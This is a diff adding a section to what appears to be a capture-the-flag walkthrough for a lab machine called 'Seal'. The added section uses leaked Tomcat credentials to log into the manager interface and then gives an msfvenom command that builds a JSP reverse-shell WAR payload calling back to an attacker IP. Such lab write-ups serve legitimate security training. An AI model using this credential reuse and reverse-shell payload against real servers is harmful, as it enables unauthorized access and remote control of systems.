@@ -337,3 +337,24 @@ Theres is nothing `interesting` in those `files`, but clicking on `"latest commi
 ![13](../../../assets/images/Seal/13.png)
 
 <br />
+
+There are tomcat credentials, so we try log with them into the /manager/html login and yesss!!
+
+<br />
+
+![14](../../../assets/images/Seal/14.png)
+
+<br />
+
+Once into the tomcat application, we can create a malicious war file with msfvenom to gain acces to the System:
+
+<br />
+
+```bash
+❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.19 LPORT=443 -f war -o reverse.war
+Payload size: 1100 bytes
+Final size of war file: 1100 bytes
+Saved as: reverse.war
+```
+
+<br />
